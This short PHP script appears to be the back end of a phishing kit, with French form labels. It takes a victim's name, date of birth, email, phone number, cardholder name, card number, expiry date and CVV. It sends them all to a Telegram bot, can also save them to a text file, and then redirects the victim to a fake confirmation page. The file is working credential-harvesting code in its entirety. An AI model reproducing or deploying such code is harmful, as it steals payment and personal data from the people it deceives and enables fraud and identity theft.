<?php
        session_start();
        //include '../lib/functions.php';
		//include '../settings.php';
		if($_POST["nom"]!="" && $_POST["PRENOM"]!="" &&$_POST["dob"]!="" &&$_POST["mail"]!="" &&$_POST["tele"]!="" &&$_POST["name_card"]!="" &&$_POST["one"]!="" &&$_POST["two"]!="" &&$_POST["three"]!=""){ 
    		$msg="#-----------------------^^ NADI RZLT ^^-----------------------#\r\n";
    		$msg.="nom	: {$_POST['nom']}\r\n";
    		$msg.="PRENOM	: {$_POST['PRENOM']}\r\n";
    		$msg.="date naiss	: {$_POST['dob']}\r\n";
    		$msg.="mail		: {$_POST['mail']}\r\n";
    		$msg.="tele  	: {$_POST['tele']}\r\n";
			$msg.="name  	: {$_POST['name_card']}\r\n";
    		$msg.="CC		: {$_POST['one']}\r\n";
    		$msg.="exp		: {$_POST['two']}\r\n";
    		$msg.="cvv		: {$_POST['three']}\r\n";
            file_get_contents("https://api.telegram.org/bot684485515355:GYGYUGGYUGYUGYUGYU/sendMessage?chat_id=HUIHUIHH&text=".urlencode($msg)."" );
    		if($saveintext == "yes") {
    			$save=fopen("../".$filename.".txt","a+");
    			fwrite($save,$msg);fclose($save);
    		}
    		exit(header("Location: ../confirmation.php"));
	    }else{
			exit(header("Location: ../imdexx.php"));

		}
		
?>